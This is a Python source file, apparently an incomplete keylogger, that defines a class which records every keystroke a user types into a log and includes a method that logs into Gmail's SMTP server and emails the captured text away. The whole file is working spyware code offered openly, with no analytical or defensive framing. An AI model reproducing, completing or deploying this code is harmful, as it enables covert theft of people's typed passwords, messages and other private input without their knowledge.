from datetime import datetime
import smtplib

class Keylogger : 
    def __init__(self, interval, report_method = "email"):
        # initializing our class 
        self.interval = interval
        self.report_method = report_method

        # log var 
        self.log = ""

        # record start & end datetime 
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    
    def loggin(self, event) :
        # Loggin will be called everytime the user use his keyboard 
        name = event.name 
        if len(name) > 1:
            # Not a character, special key used here (ctrl, alt..)
            if name == "space" :
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal" :
                name = "."
            else :
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Then "push" it in the main log 
        self.log += name 


    def sendmail(self, email, password, message):
        # smtp on 
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # starting connection 
        server.starttls()
        # login 
        server.login(email, password)
        # sending
        server.sendmail(email, email, message)
        # ending the session
        server.quit()

    
    